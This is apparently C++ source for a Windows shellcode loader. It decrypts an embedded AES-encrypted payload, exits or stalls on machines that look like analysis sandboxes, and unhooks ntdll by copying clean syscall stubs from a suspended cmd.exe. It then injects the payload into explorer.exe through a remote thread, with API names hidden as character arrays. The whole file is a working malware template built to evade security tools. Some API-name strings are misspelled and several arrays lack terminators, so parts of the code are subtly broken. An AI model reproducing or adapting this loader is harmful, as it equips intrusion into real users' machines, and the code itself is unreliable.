//x86_64-w64-mingw32-g++ -o pf.exe pfv2.cpp -l psapi -Wl,--subsystem,windows
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>

#define DIV 1024
#define _WIN32_WINNT 0x0600

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

using namespace std;

unsigned char payload[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };
unsigned int payload_len = sizeof(payload);

typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef PVOID (WINAPI * VirtualAlloc_t)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID (WINAPI * VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI * WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
typedef HANDLE (WINAPI * CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE (WINAPI * OpenProcess_t)(DWORD, BOOL, DWORD);
typedef PVOID (WINAPI * WaitForSingleObject_t)(HANDLE, DWORD);
typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(DWORD, DWORD);

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindTarget(const char *procname) {
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
	
	unsigned char sCreateToolhelp32Snapshot[] = {'C','r','e','a','t','e','T','o','o','l','3','2','S','n', 'a', 'p', 's', 'h', 'o', 't'};
	CreateToolhelp32Snapshot_t CreateToolhelp32Snapshot_p = (CreateToolhelp32Snapshot_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateToolhelp32Snapshot);
	hProcSnap = CreateToolhelp32Snapshot_p(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32); 
			
	if (!Process32First(hProcSnap, &pe32)) {
			CloseHandle(hProcSnap);
			return 0;
	}
	
	
	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
				pid = pe32.th32ProcessID;
				break;
		}
	}
			
	CloseHandle(hProcSnap);
			
	return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
    
    unsigned char sVirtualAllocEx[] = {'V','i','r','t','u','a','l','A','l','l','o','c','E','x'};
	VirtualAllocEx_t VirtualAllocEx_p = (VirtualAllocEx_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAllocEx);

	pRemoteCode = VirtualAllocEx_p(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);

    unsigned char sWriteProcessMemory[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e', 'm', 'o', 'r', 'y'};
	WriteProcessMemory_t WriteProcessMemory_p = (WriteProcessMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWriteProcessMemory);
	WriteProcessMemory_p(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, NULL);
	
    unsigned char sCreateRemoteThread[] = {'C','r','e','a','t','e','R','e','m','o','t','e','T','h', 'r', 'e', 'a', 'd'};
	CreateRemoteThread_t CreateRemoteThread_p = (CreateRemoteThread_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateRemoteThread);

	hThread = CreateRemoteThread_p(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


int FindFirstSyscall(char * pMem, DWORD size){
	
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3"; 
	BYTE pattern2[] = "\xcc\xcc\xcc"; 
	
	for (i = 0; i < size - 3; i++) {
		if (!memcmp(pMem + i, pattern1, 3)) {
			offset = i;
			break;
		}
	}		
	
	for (i = 3; i < 50 ; i++) {
		if (!memcmp(pMem + offset - i, pattern2, 3)) {
			offset = offset - i + 3;
			break;
		}		
	}

	return offset;
}


int FindLastSysCall(char * pMem, DWORD size) {

	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc"; 
	
	for (i = size - 9; i > 0; i--) {
		if (!memcmp(pMem + i, pattern, 9)) {
			offset = i + 6;
			break;
		}
	}		
	
	return offset;
}
		
		
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {

	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);
	int i;

	unsigned char sVirtualProtect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t'};
	
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	char txtSection[] = {'.', 't', 'e', 'x', 't'};
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *)pImgSectionHead->Name, txtSection)) {
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) {
					return -1;
			}

			DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			
			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
				DWORD SC_size = SC_end - SC_start;
				memcpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
						(LPVOID)((DWORD_PTR) pCache + + SC_start),
						SC_size);
			}

			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) {
					return -1;
			}
			return 0;
		}
	}
	
	return -1;
}


int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SYSTEM_INFO sysInfo;
	MEMORYSTATUSEX memInfo;
	GetNativeSystemInfo(&sysInfo);
	memInfo.dwLength = sizeof(memInfo);
	GlobalMemoryStatusEx(&memInfo);

	if ((memInfo.ullTotalPhys/DIV) < 2000000) {
		int i = 1;
		while(true) {
			i++;
		}
		return -1;
	}

	if (sysInfo.dwNumberOfProcessors < 2) {
		float i = 1.1;
		while(true) {
			i += 0.1;
		}
		return -1;
	}

	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100) return false;

	int pid = 0;
    HANDLE hProc = NULL;
	int ret = 0;

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	char path[] = "C:\\Windows\\System32\\";
	char pToCreate[] = {'c','m','d','.','e','x','e'};
	char ntMod[] = {'n','t','d','l','l','.','d','l','l'};
    
	BOOL success = CreateProcessA(
		NULL, 
		(LPSTR) pToCreate, 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		NULL, 
		path, 
		&si, 
		&pi);

	if (success == FALSE) {
		return 1;
	}	

	char * pNtdllAddr = (char *) GetModuleHandle(ntMod);
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pNtdllAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pNtdllAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	
	SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
	
    unsigned char sVirtualAlloc[] = {'V','i','r','t','a','l','A','l','l','o','c'};
	VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAlloc);
	LPVOID pCache = VirtualAlloc_p(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
		
	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
		return -1;	
	TerminateProcess(pi.hProcess, 0);

	ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pCache);
	VirtualFree(pCache, 0, MEM_RELEASE);
	DWORD oldProtect = 0;
	char target[] = "explorer.exe";
	pid = FindTarget(target);
	
	if (pid) {
        unsigned char sOpenProcess[] = {'O','p','e','n','P','r','o','c','e','s','s'};
	    OpenProcess_t OpenProcess_p = (OpenProcess_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sOpenProcess);
		hProc = OpenProcess_p( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
